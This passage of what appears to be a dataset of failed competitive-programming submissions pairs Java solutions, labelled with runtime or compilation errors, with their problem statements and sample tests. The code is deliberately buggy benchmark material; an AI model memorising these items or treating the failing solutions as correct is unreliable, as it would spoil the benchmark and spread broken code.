bo = 0;\n\t\tint sp = 0;\n\t\t\n\t\tList<Widgit> list = new ArrayList<Widgit>();\n\t\t\n\t\tpublic void setBorder(int b){\n\t\t\tbo = b;\n\t\t}\n\t\tpublic void setSpace(int s){\n\t\t\tsp = s;\n\t\t}\n\t\t\n\t\tpublic void pack(Widgit w){\n\t\t\tlist.add(w);\n\t\t}\n\t\t\n\t\tpublic Boxbase(){\n\t\t\t\n\t\t}\n\t\tpublic Boxbase(int x, int y){\n\t\t\tthis.x = x;\n\t\t\tthis.y = y;\n\t\t}\n\t}\n\t\n\tprivate class VBox extends Boxbase{\n\t\tpublic VBox(){\n\t\t\t\n\t\t}\n\t\tpublic VBox(int x, int y){\n\t\t\tthis.x = x;\n\t\t\tthis.y = y;\n\t\t}\n\t\t\n\t\tpublic int getSizeX(){\n\t\t\tif(list.size() == 0){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\t\n\t\t\tint x = 0;\n\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\t\n\t\t\t\tx = Math.max(x, list.get(i).getSizeX());\n\t\t\t}\n\t\t\tx+= 2* bo;\n\t\t\n\t\t\treturn x;\n\t\t}\n\t\tpublic int getSizeY(){\n\t\t\tif(list.size() == 0){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tint y = 0;\n\t\n\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\ty += list.get(i).getSizeY();\n\t\t\t}\n\t\t\n\t\t\ty += 2*bo;\n\t\t\tint spnum = list.size() - 1;\n\t\t\ty+=spnum * sp;\n\t\t\treturn y;\n\t\t}\n\t\t\n\t\tpublic String getSize(){\n\t\t\tif(list.size() == 0){\n\t\t\t\treturn \"0 0\";\n\t\t\t}\n\t\t\tint y = 0;\n\t\t\tint x = 0;\n\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\ty += list.get(i).getSizeY();\n\t\t\t\tx = Math.max(x, list.get(i).getSizeX());\n\t\t\t}\n\t\t\tx+= 2* bo;\n\t\t\ty += 2*bo;\n\t\t\tint spnum = list.size() - 1;\n\t\t\ty+=spnum * sp;\n\t\t\tString ans = x + \" \" + y;\n\t\t\treturn ans;\n\t\t}\n\t\t\n\t}\n\t\n\tprivate class HBox extends Boxbase{\n\t\tpublic HBox(){\n\t\t\t\n\t\t}\n\t\tpublic HBox(int x, int y){\n\t\t\tthis.x = x;\n\t\t\tthis.y = y;\n\t\t}\n\t\t\n\t\tpublic int getSizeX(){\n\t\t\tif(list.size() == 0){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\n\t\t\tint x = 0;\n\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\tx += list.get(i).getSizeX();\n\t\t\t\t\n\t\t\t}\n\t\t\tx+= 2* bo;\n\t\t\n\t\t\tint spnum = list.size() - 1;\n\t\t\tx+=spnum * sp;\n\t\t\treturn x;\n\t\t}\n\t\tpublic int getSizeY(){\n\t\t\tif(list.size() == 0){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tint y = 0;\n\t\t\n\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\t\n\t\t\t\ty = Math.max(y, list.get(i).getSizeY());\n\t\t\t}\n\t\t\t\n\t\t\ty += 2*bo;\n\t\n\t\t\treturn y;\n\t\t}\n\t\t\n\t\tpublic String getSize(){\n\t\t\tif(list.size() == 0){\n\t\t\t\treturn \"0 0\";\n\t\t\t}\n\t\t\tint y = 0;\n\t\t\tint x = 0;\n\t\t\tfor(int i = 0; i < list.size(); i++){\n\t\t\t\tx += list.get(i).getSizeX();\n\t\t\t\ty = Math.max(y, list.get(i).getSizeY());\n\t\t\t}\n\t\t\tx+= 2* bo;\n\t\t\ty += 2*bo;\n\t\t\tint spnum = list.size() - 1;\n\t\t\tx+=spnum * sp;\n\t\t\tString ans = x + \" \" + y;\n\t\t\treturn ans;\n\t\t}\n\t}\n\t\n\t\/**\n\t * @param args\n\t *\/\n\tpublic static void main(String[] args) throws Exception{\n\t\tD t = new D();\n\t\tt.run();\n\n\t}\n\n}\n","description":"It is nighttime and Joe the Elusive got into the country's main bank's safe. The safe has n cells positioned in a row, each of them contains some amount of diamonds. Let's make the problem more comfortable to work with and mark the cells with positive numbers from 1 to n from the left to the right.Unfortunately, Joe didn't switch the last security system off. On the plus side, he knows the way it works.Every minute the security system calculates the total amount of diamonds for each two adjacent cells (for the cells between whose numbers difference equals 1). As a result of this check we get an n\u2009-\u20091 sums. If at least one of the sums differs from the corresponding sum received during the previous check, then the security system is triggered.Joe can move the diamonds from one cell to another between the security system's checks. He manages to move them no more than m times between two checks. One of the three following operations is regarded as moving a diamond: moving a diamond from any cell to any other one, moving a diamond from any cell to Joe's pocket, moving a diamond from Joe's pocket to any cell. Initially Joe's pocket is empty, and it can carry an unlimited amount of diamonds. It is considered that before all Joe's actions the system performs at least one check.In the morning the bank employees will come, which is why Joe has to leave the bank before that moment. Joe has only k minutes left before morning, and on each of these k minutes he can perform no more than m operations. All that remains in Joe's pocket, is considered his loot.Calculate the largest amount of diamonds Joe can carry with him. Don't forget that the security system shouldn't be triggered (even after Joe leaves the bank) and Joe should leave before morning.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers n, m and k (1\u2009\u2264\u2009n\u2009\u2264\u2009104, 1\u2009\u2264\u2009m,\u2009k\u2009\u2264\u2009109). The next line contains n numbers. The i-th number is equal to the amount of diamonds in the i-th cell \u2014 it is an integer from 0 to 105.","output_spec":"Print a single number \u2014 the maximum number of diamonds Joe can steal.","notes":"NoteIn the second sample Joe can act like this:The diamonds' initial positions are 4 1 3.During the first period of time Joe moves a diamond from the 1-th cell to the 2-th one and a diamond from the 3-th cell to his pocket.By the end of the first period the diamonds' positions are 3 2 2. The check finds no difference and the security system doesn't go off.During the second period Joe moves a diamond from the 3-rd cell to the 2-nd one and puts a diamond from the 1-st cell to his pocket.By the end of the second period the diamonds' positions are 2 3 1. The check finds no difference again and the security system doesn't go off.Now Joe leaves with 2 diamonds in his pocket.","sample_inputs":["2 3 1\n2 3","3 2 2\n4 1 3"],"sample_outputs":["0","2"]}
{"difficulty":2200,"lang":"Java 8","lang_cluster":"java","src_uid":"bb4ecfaaccd538e23f883a18f9672af8","submission_id":"re_375","tags":["implementation","greedy","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.*;\nimport java.lang.reflect.Array;\nimport java.math.*;\nimport java.security.*;\nimport java.text.*;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.regex.*;\n\npublic class Solution {\n    \n    private static final Scanner sc = new Scanner(System.in);\n\n    public static void main(String[] args) throws IOException {\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(System.out));\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n        int n = Integer.parseInt(br.readLine());\n        StringTokenizer st = new StringTokenizer(br.readLine());\n        int[] arr = new int[n];\n        for (int i=0; i<n; ++i){\n            arr[i] = (Integer.parseInt(st.nextToken())%2);\n        }\n        int[] zz = new int[n];\n        for (int i=0; i<n; ++i)\n            zz[i] = arr[i]^1;\n        int ans = solve(arr, n);\n        \n        ans |= solve(zz,n);\n        System.out.println(ans==0?\"NO\":\"YES\");\n        sc.close();\n        br.close();\n        bw.close();\n    }\n    \n    public static int solve(int[] arr, int n){\n        for (int i=1; i<n; ++i){\n            if (arr[i] == 1 && arr[i-1]==1){\n                arr[i] = 0;\n                arr[i-1] = 0;\n            }\n        }\n        int cur0 = 0;\n        int cc1 = 0;\n        for (int i=0; i<n; ++i){\n            if (arr[i] == 0)\n                cur0++;\n            else {\n                cc1++;\n                if (cur0%2==1){\n                    return 0;\n                } else {\n                    cur0 = 0;\n                }\n            }\n        }\n        if (cc1>0 && cur0%2==1)\n            return 0;\n        else \n            return 1;\n    }\n  \n}","description":"Vova's family is building the Great Vova Wall (named by Vova himself). Vova's parents, grandparents, grand-grandparents contributed to it. Now it's totally up to Vova to put the finishing touches.The current state of the wall can be respresented by a sequence $$$a$$$ of $$$n$$$ integers, with $$$a_i$$$ being the height of the $$$i$$$-th part of the wall.Vova can only use $$$2 \\times 1$$$ bricks to put in the wall (he has infinite supply of them, however).Vova can put bricks horizontally on the neighboring parts of the wall of equal height. It means that if for some $$$i$$$ the current height of part $$$i$$$ is the same as for part $$$i + 1$$$, then Vova can put a brick there and thus increase both heights by 1. Obviously, Vova can't put bricks in such a way that its parts turn out to be off the borders (to the left of part $$$1$$$ of the wall or to the right of part $$$n$$$ of it).The next paragraph is specific to the version 1 of the problem.Vova can also put bricks vertically. That means increasing height of any part of the wall by 2.Vova is a perfectionist, so he considers the wall completed when:  all parts of the wall has the same height;  the wall has no empty spaces inside it. Can Vova complete the wall using any amount of bricks (possibly zero)?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^5$$$) \u2014 the number of parts in the wall. The second line contains $$$n$$$ integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le 10^9$$$) \u2014 the initial heights of the parts of the wall.","output_spec":"Print \"YES\" if Vova can complete the wall using any amount of bricks (possibly zero). Print \"NO\" otherwise.","notes":"NoteIn the first example Vova can put a brick on parts 2 and 3 to make the wall $$$[2, 2, 2, 2, 5]$$$ and then put 3 bricks on parts 1 and 2 and 3 bricks on parts 3 and 4 to make it $$$[5, 5, 5, 5, 5]$$$.In the second example Vova can put a brick vertically on part 3 to make the wall $$$[4, 5, 5]$$$, then horizontally on parts 2 and 3 to make it $$$[4, 6, 6]$$$ and then vertically on part 1 to make it $$$[6, 6, 6]$$$.In the third example the wall is already complete.","sample_inputs":["5\n2 1 1 2 5","3\n4 5 3","2\n10 10","3\n1 2 3"],"sample_outputs":["YES","YES","YES","NO"]}
{"difficulty":1700,"lang":"Java 8","lang_cluster":"java","src_uid":"be42e213ff43e303e475d77a9560367f","submission_id":"re_1391","tags":["dfs and similar","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nimport java.io.*;\nimport java.math.*;\nimport java.util.*;\n\nimport static java.util.Arrays.fill;\nimport static java.lang.Math.*;\nimport static java.util.Arrays.sort;\nimport static java.util.Collections.sort;\n\n\npublic class A213 \n{\n\n\tpublic static int mod = 1000000007;\n\tpublic static long INF = (1L << 60);\n\tstatic FastScanner2 in = new FastScanner2();\n\tstatic OutputWriter out = new OutputWriter(System.out);\n\tstatic int n;\n\tstatic ArrayList<Integer>[] parent;\n\tstatic ArrayList<Integer>[] child;\n\tstatic int[] color;\n\tstatic int[] done;\n\tpublic static int solve(int pos)\n\t{\n\t\tint ret=n;\n\t\tint count=0;\n\t\tint it=0;\n\t\twhile(true)\n\t\t{\n\t\t\tboolean one=false;\n\t\t\tfor(int i=1;i<=n;i++)\n\t\t\t{\n\t\t\t\tit++;\n\t\t\t\tif(done[i]==parent[i].size() && pos==color[i])\n\t\t\t\t{\n\t\t\t\t\tdone[i]=-1000;\n\t\t\t\t\tfor(int j : child[i])\n\t\t\t\t\t\t{\n\t\t\t\t\t\tdone[j]++;\n\t\t\t\t\t\t}\n\t\t\t\t\tone=true;\n\t\t\t\t\tcount++;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(one)\n\t\t\t\tcontinue;  \/\/to check interdependence\n\t\t\tif(count==n)\n\t\t\t\tbreak;\n\t\t\tpos++;\n\t\t\tret++;\n\t\t\tif(pos>3)\n\t\t\t\tpos-=3;\n\t\t}\n\t\tif(n!=1 && it>3*n*n)\n\t\t\tSystem.out.println(\"smk\");\n\t\treturn ret;\n\t}\n\tpublic static void main(String[] args) \n\t{\n\n\t\tn=in.nextInt();\n\t\tcolor=new int[n+1];\n\t\tparent=new ArrayList[n+1];\n\t\tchild=new ArrayList[n+1];\n\t\tdone=new int[n+1];\n\t\tfor(int i=1;i<=n;i++)\n\t\t{\n\t\t\tcolor[i]=in.nextInt();\n\t\t\tparent[i]=new ArrayList<>();\n\t\t\tchild[i]=new ArrayList<>();\n\t\t}\n\t\tfor(int i=1;i<=n;i++)\n\t\t{\n\t\t\tint x=in.nextInt();\n\t\t\twhile(x-->0)\n\t\t\t{\n\t\t\t\tint t=in.nextInt();\n\t\t\t\tparent[i].add(t);\n\t\t\t\tchild[t].add(i);\n\t\t\t}\n\t\t}\n\t\tint answer=mod;\n\t\tfor(int i=1;i<=3;i++)\n\t\t{\n\t\t\tArrays.fill(done, 0);\n\t\t\tanswer=min(answer, solve(i));\n\t\t}\n\t\tout.println(answer);\n\t\tout.close();\n\n\t}\n\t\n\tpublic static long pow(long x, long n) \n\t{\n\t\tlong res = 1;\n\t\tfor (long p = x; n > 0; n >>= 1, p = (p * p)) \n\t\t{\n\t\t\tif ((n & 1) != 0) \n\t\t\t{\n\t\t\t\tres = (res * p);\n\t\t\t}\n\t\t}\n\t\treturn res;\n\t}\n\t\n\tpublic static long pow(long x, long n, long mod) \n\t{\n\t\tlong res = 1;\n\t\tfor (long p = x; n > 0; n >>= 1, p = (p * p) % mod) \n\t\t{\n\t\t\tif ((n & 1) != 0) \n\t\t\t{\n\t\t\t\tres = (res * p % mod);\n\t\t\t}\n\t\t}\n\t\treturn res;\n\t}\n\n\tpublic static long gcd(long n1, long n2)\n\t{\n\t\tlong r;\n\t\twhile (n2 != 0) \n\t\t{\n\t\t\tr = n1 % n2;\n\t\t\tn1 = n2;\n\t\t\tn2 = r;\n\t\t}\n\t\treturn n1;\n\t}\n\n\tpublic static long lcm(long n1, long n2) \n\t{\n\t\tlong answer = (n1 * n2) \/ (gcd(n1, n2));\n\t\treturn answer;\n\t}\n\t\n\tstatic class FastScanner2 \n\t{\n\t\tprivate byte[] buf = new byte[1024];\n\t\tprivate int curChar;\n\t\tprivate int snumChars;\n\n\t\tpublic int read() \n\t\t{\n\t\t\tif (snumChars == -1)\n\t\t\t\tthrow new InputMismatchException();\n\t\t\tif (curChar >= snumChars) \n\t\t\t{\n\t\t\t\tcurChar = 0;\n\t\t\t\ttry \n\t\t\t\t{\n\t\t\t\t\tsnumChars = System.in.read(buf);\n\t\t\t\t} catch (IOException e) \n\t\t\t\t{\n\t\t\t\t\tthrow new InputMismatchException();\n\t\t\t\t}\n\t\t\t\tif (snumChars <= 0)\n\t\t\t\t\treturn -1;\n\t\t\t}\n\t\t\treturn buf[curChar++];\n\t\t}\n\n\t\tpublic String nextLine() \n\t\t{\n\t\t\tint c = read();\n\t\t\twhile (isSpaceChar(c))\n\t\t\t\tc = read();\n\t\t\tStringBuilder res = new StringBuilder();\n\t\t\tdo \n\t\t\t{\n\t\t\t\tres.appendCodePoint(c);\n\t\t\t\tc = read();\n\t\t\t} \n\t\t\twhile (!isEndOfLine(c));\n\t\t\treturn res.toString();\n\t\t}\n\n\t\tpublic String nextString() \n\t\t{\n\t\t\tint c = read();\n\t\t\twhile (isSpaceChar(c))\n\t\t\t\tc = read();\n\t\t\tStringBuilder res = new StringBuilder();\n\t\t\tdo \n\t\t\t{\n\t\t\t\tres.appendCodePoint(c);\n\t\t\t\tc = read();\n\t\t\t} \n\t\t\twhile (!isSpaceChar(c));\n\t\t\treturn res.toString();\n\t\t}\n\n\t\tpublic long nextLong()\n\t\t{\n\t\t\tint c = read();\n\t\t\twhile (isSpaceChar(c))\n\t\t\t\tc = read();\n\t\t\tint sgn = 1;\n\t\t\tif (c == '-') {\n\t\t\t\tsgn = -1;\n\t\t\t\tc = read();\n\t\t\t}\n\t\t\tlong res = 0;\n\t\t\tdo \n\t\t\t{\n\t\t\t\tif (c < '0' || c > '9')\n\t\t\t\t\tthrow new InputMismatchException();\n\t\t\t\tres *= 10;\n\t\t\t\tres += c - '0';\n\t\t\t\tc = read();\n\t\t\t} \n\t\t\twhile (!isSpaceChar(c));\n\t\t\treturn res * sgn;\n\t\t}\n\n\t\tpublic int nextInt() \n\t\t{\n\t\t\tint c = read();\n\t\t\twhile (isSpaceChar(c))\n\t\t\t\tc = read();\n\t\t\tint sgn = 1;\n\t\t\tif (c == '-') {\n\t\t\t\tsgn = -1;\n\t\t\t\tc = read();\n\t\t\t}\n\t\t\tint res = 0;\n\t\t\tdo \n\t\t\t{\n\t\t\t\tif (c < '0' || c > '9')\n\t\t\t\t\tthrow new InputMismatchException();\n\t\t\t\tres *= 10;\n\t\t\t\tres += c - '0';\n\t\t\t\tc = read();\n\t\t\t} \n\t\t\twhile (!isSpaceChar(c));\n\t\t\treturn res * sgn;\n\t\t}\n\n\t\tpublic int[] nextIntArray(int n)\n\t\t{\n\t\t\tint[] arr = new int[n];\n\t\t\tfor (int i = 0; i < n; i++) \n\t\t\t{\n\t\t\t\tarr[i] = nextInt();\n\t\t\t}\n\t\t\treturn arr;\n\t\t}\n\n\t\tpublic long[] nextLongArray(int n)\n\t\t{\n\t\t\tlong[] arr = new long[n];\n\t\t\tfor (int i = 0; i < n; i++) \n\t\t\t{\n\t\t\t\tarr[i] = nextLong();\n\t\t\t}\n\t\t\treturn arr;\n\t\t}\n\n\t\tprivate boolean isSpaceChar(int c)\n\t\t{\n\t\t\treturn c == ' ' || c == '\\n' || c == '\\r' || c == '\\t' || c == -1;\n\t\t}\n\n\t\tprivate boolean isEndOfLine(int c) \n\t\t{\n\t\t\treturn c == '\\n' || c == '\\r' || c == -1;\n\t\t}\n\t}\n\n\tstatic class InputReader \n\t{\n\t\tpublic BufferedReader reader;\n\t\tpublic StringTokenizer tokenizer;\n\n\t\tpublic InputReader(InputStream inputstream) \n\t\t{\n\t\t\treader = new BufferedReader(new InputStreamReader(inputstream));\n\t\t\ttokenizer = null;\n\t\t}\n\n\t\tpublic String nextLine() \n\t\t{\n\t\t\tString fullLine = null;\n\t\t\twhile (tokenizer == null || !tokenizer.hasMoreTokens())\n\t\t\t{\n\t\t\t\ttry \n\t\t\t\t{\n\t\t\t\t\tfullLine = reader.readLine();\n\t\t\t\t} catch (IOException e)\n\t\t\t\t{\n\t\t\t\t\tthrow new RuntimeException(e);\n\t\t\t\t}\n\t\t\t\treturn fullLine;\n\t\t\t}\n\t\t\treturn fullLine;\n\t\t}\n\n\t\tpublic String next()\n\t\t{\n\t\t\twhile (tokenizer == null || !tokenizer.hasMoreTokens()) \n\t\t\t{\n\t\t\t\ttry \n\t\t\t\t{\n\t\t\t\t\ttokenizer = new StringTokenizer(reader.readLine());\n\t\t\t\t} catch (IOException e) \n\t\t\t\t{\n\t\t\t\t\tthrow new RuntimeException(e);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn tokenizer.nextToken();\n\t\t}\n\n\t\tpublic long nextLong() \n\t\t{\n\t\t\treturn Long.parseLong(next());\n\t\t}\n\n\t\tpublic int[] nextIntArray(int n) \n\t\t{\n\t\t\tint a[] = new int[n];\n\t\t\tfor (int i = 0; i < n; i++) \n\t\t\t{\n\t\t\t\ta[i] = nextInt();\n\t\t\t}\n\t\t\treturn a;\n\t\t}\n\n\t\tpublic long[] nextLongArray(int n)\n\t\t{\n\t\t\tlong a[] = new long[n];\n\t\t\tfor (int i = 0; i < n; i++) \n\t\t\t{\n\t\t\t\ta[i] = nextLong();\n\t\t\t}\n\t\t\treturn a;\n\t\t}\n\n\t\tpublic int nextInt() \n\t\t{\n\t\t\treturn Integer.parseInt(next());\n\t\t}\n\t}\n\n\tstatic class OutputWriter \n\t{\n\t\tprivate final PrintWriter writer;\n\n\t\tpublic OutputWriter(OutputStream outputStream) \n\t\t{\n\t\t\twriter = new PrintWriter(new BufferedWriter(new OutputStreamWriter(outputStream)));\n\t\t}\n\n\t\tpublic OutputWriter(Writer writer)\n\t\t{\n\t\t\tthis.writer = new PrintWriter(writer);\n\t\t}\n\n\t\tpublic void print(Object... objects)\n\t\t{\n\t\t\tfor (int i = 0; i < objects.length; i++) \n\t\t\t{\n\t\t\t\tif (i != 0)\n\t\t\t\t\twriter.print(' ');\n\t\t\t\twriter.print(objects[i]);\n\t\t\t}\n\t\t}\n\n\t\tpublic void println(Object... objects)\n\t\t{\n\t\t\tprint(objects);\n\t\t\twriter.println();\n\t\t}\n\n\t\tpublic void close() \n\t\t{\n\t\t\twriter.close();\n\t\t}\n\n\t\tpublic void flush() \n\t\t{\n\t\t\twriter.flush();\n\t\t}\n\t}\nprivate static boolean oj = System.getProperty(\"ONLINE_JUDGE\") != null;\n\t\n\tprivate static void tr(Object... o) \n\t{\n\t\tif (!oj)\n\t\t\tSystem.out.println(Arrays.deepToString(o));\n\t}\n}","description":"Furik and Rubik love playing computer games. Furik has recently found a new game that greatly interested Rubik. The game consists of n parts and to complete each part a player may probably need to complete some other ones. We know that the game can be fully completed, that is, its parts do not form cyclic dependencies. Rubik has 3 computers, on which he can play this game. All computers are located in different houses. Besides, it has turned out that each part of the game can be completed only on one of these computers. Let's number the computers with integers from 1 to 3. Rubik can perform the following actions:   Complete some part of the game on some computer. Rubik spends exactly 1 hour on completing any part on any computer.  Move from the 1-st computer to the 2-nd one. Rubik spends exactly 1 hour on that.  Move from the 1-st computer to the 3-rd one. Rubik spends exactly 2 hours on that.  Move from the 2-nd computer to the 1-st one. Rubik spends exactly 2 hours on that.  Move from the 2-nd computer to the 3-rd one. Rubik spends exactly 1 hour on that.  Move from the 3-rd computer to the 1-st one. Rubik spends exactly 1 hour on that.  Move from the 3-rd computer to the 2-nd one. Rubik spends exactly 2 hours on that. Help Rubik to find the minimum number of hours he will need to complete all parts of the game. Initially Rubik can be located at the computer he considers necessary. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009200) \u2014 the number of game parts. The next line contains n integers, the i-th integer \u2014 ci (1\u2009\u2264\u2009ci\u2009\u2264\u20093) represents the number of the computer, on which you can complete the game part number i.  Next n lines contain descriptions of game parts. The i-th line first contains integer ki (0\u2009\u2264\u2009ki\u2009\u2264\u2009n\u2009-\u20091), then ki distinct integers ai,\u2009j (1\u2009\u2264\u2009ai,\u2009j\u2009\u2264\u2009n;\u00a0ai,\u2009j\u2009\u2260\u2009i) \u2014 the numbers of parts to complete before part i. Numbers on all lines are separated by single spaces. You can assume that the parts of the game are numbered from 1 to n in some way. It is guaranteed that there are no cyclic dependencies between the parts of the game.","output_spec":"On a single line print the answer to the problem.","notes":"NoteNote to the second sample: before the beginning of the game the best strategy is to stand by the third computer. First we complete part 5. Then we go to the 1-st computer and complete parts 3 and 4. Then we go to the 2-nd computer and complete parts 1 and 2. In total we get 1+1+2+1+2, which equals 7 hours.","sample_inputs":["1\n1\n0","5\n2 2 1 1 3\n1 5\n2 5 1\n2 5 4\n1 5\n0"],"sample_outputs":["1","7"]}
{"difficulty":1600,"lang":"Java 7","lang_cluster":"java","src_uid":"c761bb69cf1b5a3dbe38d9f5c46e9007","submission_id":"re_1314","tags":["data structures","constructive algorithms","implementation"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.io.BufferedReader;\nimport java.io.OutputStream;\nimport java.io.PrintWriter;\nimport java.util.StringTokenizer;\nimport java.io.InputStream;\n\n\npublic class Main {\n\tpublic static void main(String[] args) {\n\t\tInputStream inputStream = System.in;\n\t\tOutputStream outputStream = System.out;\n\t\tInputReader in = new InputReader(inputStream);\n\t\tPrintWriter out = new PrintWriter(outputStream);\n\t\tTask solver = new Task();\n\t\tsolver.solve(1, in, out);\n\t\tout.close();\n\t}\n}\n\nclass Task {\n    \n\tpublic void solve(int testNumber, InputReader in, PrintWriter out) {\n\t\tint n = in.nextInt();\n\t\tint m = in.nextInt();\n\t\tint[] positive = new int[n];\n\t\tint[] negative = new int[n];\n\t\tint cnt = 0;\n\t\tString[] memo = new String[n];\n\t\tfor (int k = 0; k < n; ++k) {\n\t\t\tString s = in.next();\n\t\t\tmemo[k] = s;\n\t\t\tint id = Integer.parseInt(s.substring(1)) - 1;\n\t\t\tif (s.startsWith(\"+\")) {\n\t\t\t\tpositive[id]++;\n\t\t\t} else {\n\t\t\t\tnegative[id]++;\n\t\t\t\tcnt++;\n\t\t\t}\n\t\t}\n\t\t\n\t\tboolean[] maybe = new boolean[n];\n\t\tint all = 0;\n\t\tfor (int k = 0; k < n; ++k) {\n\t\t\tint tmp = cnt + positive[k] - negative[k];\n\t\t\tif (tmp == m) {\n\t\t\t\tmaybe[k] = true;\n\t\t\t\tall++;\n\t\t\t}\n\t\t}\n\t\t\n\t\tfor (int k = 0; k < n; ++k) {\n\t\t\tString s = memo[k];\n\t\t\tint id = Integer.parseInt(s.substring(1)) - 1;\n\t\t\tif (s.startsWith(\"+\")) {\n\t\t\t\tif (!maybe[id]) {\n\t\t\t\t\tout.println(\"Lie\");\n\t\t\t\t} else {\n\t\t\t\t\tout.println(all == 1 ? \"True\" : \"Not defined\");\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tif (!maybe[id]) {\n\t\t\t\t\tout.println(\"True\");\n\t\t\t\t} else {\n\t\t\t\t\tout.println(all == 1 ? \"Lie\" : \"Not defined\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t}\n}\n\nclass InputReader {\n    private BufferedReader reader;\n    private StringTokenizer tokenizer;\n\n    public InputReader(InputStream stream) {\n        reader = new BufferedReader(new InputStreamReader(stream));\n        tokenizer = null;\n    }\n\n    public String next() {\n        while (tokenizer == null || !tokenizer.hasMoreTokens()) {\n            try {\n                tokenizer = new StringTokenizer(reader.readLine());\n            } catch (IOException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        return tokenizer.nextToken();\n    }\n\n    public int nextInt() {\n        return Integer.parseInt(next());\n    }\n\n    public long nextLong() {\n        return Long.parseLong(next());\n    }\n}\n","description":"As Sherlock Holmes was investigating a crime, he identified n suspects. He knows for sure that exactly one of them committed the crime. To find out which one did it, the detective lines up the suspects and numbered them from 1 to n. After that, he asked each one: \"Which one committed the crime?\". Suspect number i answered either \"The crime was committed by suspect number ai\", or \"Suspect number ai didn't commit the crime\". Also, the suspect could say so about himself (ai\u2009=\u2009i).Sherlock Holmes understood for sure that exactly m answers were the truth and all other answers were a lie. Now help him understand this: which suspect lied and which one told the truth?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009n) \u2014 the total number of suspects and the number of suspects who told the truth. Next n lines contain the suspects' answers. The i-th line contains either \"+ai\" (without the quotes), if the suspect number i says that the crime was committed by suspect number ai, or \"-ai\" (without the quotes), if the suspect number i says that the suspect number ai didn't commit the crime (ai is an integer, 1\u2009\u2264\u2009ai\u2009\u2264\u2009n). It is guaranteed that at least one suspect exists, such that if he committed the crime, then exactly m people told the truth.","output_spec":"Print n lines. Line number i should contain \"Truth\" if suspect number i has told the truth for sure. Print \"Lie\" if the suspect number i lied for sure and print \"Not defined\" if he could lie and could tell the truth, too, depending on who committed the crime.","notes":"NoteThe first sample has the single person and he confesses to the crime, and Sherlock Holmes knows that one person is telling the truth. That means that this person is telling the truth.In the second sample there are three suspects and each one denies his guilt. Sherlock Holmes knows that only two of them are telling the truth. Any one of them can be the criminal, so we don't know for any of them, whether this person is telling the truth or not.In the third sample the second and the fourth suspect defend the first and the third one. But only one is telling the truth, thus, the first or the third one is the criminal. Both of them can be criminals, so the second and the fourth one can either be lying or telling the truth. The first and the third one are lying for sure as they are blaming the second and the fourth one.","sample_inputs":["1 1\n+1","3 2\n-1\n-2\n-3","4 1\n+2\n-3\n+4\n-1"],"sample_outputs":["Truth","Not defined\nNot defined\nNot defined","Lie\nNot defined\nLie\nNot defined"]}
{"difficulty":2600,"lang":"Java 6","lang_cluster":"java","src_uid":"c7e0c6b93a2f2f43fe9da405409c91e6","submission_id":"re_1110","tags":["dp"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.*;\nimport java.lang.Math;\nimport java.util.Scanner;\n\npublic class main\n{\n\tpublic static Scanner in;\n\tpublic static PrintStream out;\n\t\n\tpublic static void test()\n\t{\n\t\tint ti = in.nextInt();\n\t\tint td = in.nextInt();\n\t\tint tr = in.nextInt();\n\t\tint te = in.nextInt();\n\t\t\n\t\tin.nextLine();\n\t\t\n\t\tString A = in.nextLine();\n\t\t\n\t\tif (A.length()==0)\n\t\t{\n\t\t\tA = in.nextLine();\n\t\t}\n\t\t\n\t\tString B = in.nextLine();\n\t\t\n\t\tint N = A.length();\n\t\tint M = B.length();\n\t\t\n\t\tint i,j;\n\t\t\n\t\tint t[][] = new int[N+1][];\n\t\tfor (i=0; i<=N; i++)\n\t\t{\n\t\t\tt[i] = new int[M+1];\n\t\t}\n\t\t\n\t\tt[0][0] = 0;\n\t\tfor (i=1; i<=N; i++)\n\t\t{\n\t\t\tt[i][0] = td * i;\n\t\t}\n\t\tfor (j=1; j<=M; j++)\n\t\t{\n\t\t\tt[0][j] = ti * j;\n\t\t}\n\t\t\n\t\tint m;\n\t\tfor (i=1; i<=N; i++)\n\t\t{\n\t\t\tfor (j=1;j<=M;j++)\n\t\t\t{\n\t\t\t\tm = tr + t[i-1][j-1];\n\t\t\t\n\t\t\t\tif (A.charAt(i-1) == B.charAt(j-1))\n\t\t\t\t{\n\t\t\t\t\tm = Math.min(m, t[i-1][j-1]);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tm = Math.min(m, td + t[i-1][j]);\n\t\t\t\tm = Math.min(m, ti + t[i][j-1]);\n\t\t\t\t\n\t\t\t\tif ((i>1)&&(j>1)&&(A.charAt(i-1) == B.charAt(j-2))&&(A.charAt(i-2) == B.charAt(j-1)))\n\t\t\t\t{\n\t\t\t\t\tm = Math.min(m, te + t[i-2][j-2]);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tt[i][j] = 